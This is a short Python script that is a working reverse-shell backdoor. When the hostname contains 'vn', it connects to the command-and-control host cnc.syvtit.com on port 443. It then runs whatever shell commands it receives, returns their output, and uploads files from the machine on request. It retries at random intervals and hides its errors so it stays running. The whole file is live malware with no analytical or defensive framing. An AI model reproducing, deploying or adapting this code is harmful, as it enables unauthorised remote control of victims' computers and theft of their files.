import socket
import subprocess
import os
import logging
import random
import time
logger = logging.Logger('catch_all')
l = 20480

def transfer(s,path):
    if os.path.exists(path):
        f = open(path,'rb')
        packet = f.read(l)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(l)
        s.send('DONE'.encode())
    else:
        s.send('File not found'.encode())


def handler(command):
    cmd = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    return cmd.stdout.read()+'\n'.encode()+cmd.stderr.read()
def connect():
    if('vn' in socket.gethostname().lower()):
        s = socket.socket()
        s.connect(("cnc.syvtit.com",443))
        while True:
            command = s.recv(l)
            if 'terminate' in command.decode():
                s.close()  
                return 1              
            elif 'upload' in command.decode():
                upload, path = command.decode().split("*")
                try:
                    transfer(s,path)
                except Exception as e:
                    logger.error(str(e))
                    pass
            else:
                result=handler(command)
                s.send(result)

def main():
    while True:
        try:
            sleep_for=random.randrange(1,10)
            time.sleep(int(sleep_for))
            if connect()==1:
                break
        except:
            sleep_for=random.randrange(1,10)
            time.sleep(int(sleep_for))
            pass

main()